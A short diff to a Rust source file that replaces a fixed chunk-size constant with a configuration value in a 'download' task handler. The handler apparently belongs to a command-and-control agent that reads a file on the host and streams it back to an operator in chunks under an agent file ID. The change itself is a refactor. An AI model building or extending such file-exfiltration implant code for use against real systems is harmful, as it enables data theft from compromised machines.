@@ -8,7 +8,7 @@ use std::{
 use base64::engine::general_purpose;
 use base64::Engine;
 
-const CHUNK_SIZE: usize = 4096;
+use crate::config;
 
 #[derive(Deserialize)]
 struct DownloadParams {
@@ -33,7 +33,7 @@ pub fn download(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
 
     // 3. Stat file and compute total_chunks
     let size = metadata(&path)?.len() as usize;
-    let total_chunks = size / CHUNK_SIZE + (size % CHUNK_SIZE > 0) as usize;
+    let total_chunks = size / config::chunk_size + (size % config::chunk_size > 0) as usize;
 
     // 4. Send initial RPC to get back agent_file_id
     let init = serde_json::json!({
@@ -43,7 +43,7 @@ pub fn download(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
             "download": {
                 "total_chunks": total_chunks,
                 "full_path": path.to_string_lossy(),
-                "chunk_size": CHUNK_SIZE
+                "chunk_size": config::chunk_size
             }
         }]
     })
@@ -55,7 +55,7 @@ pub fn download(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
 
     // 5. Stream the file back in chunks
     let mut f = File::open(&path)?;
-    let mut buffer = vec![0u8; CHUNK_SIZE];
+    let mut buffer = vec![0u8; config::chunk_size];
     let mut chunk_num = 1;
     while let Ok(n) = f.read(&mut buffer) {
         if n == 0 { break; }
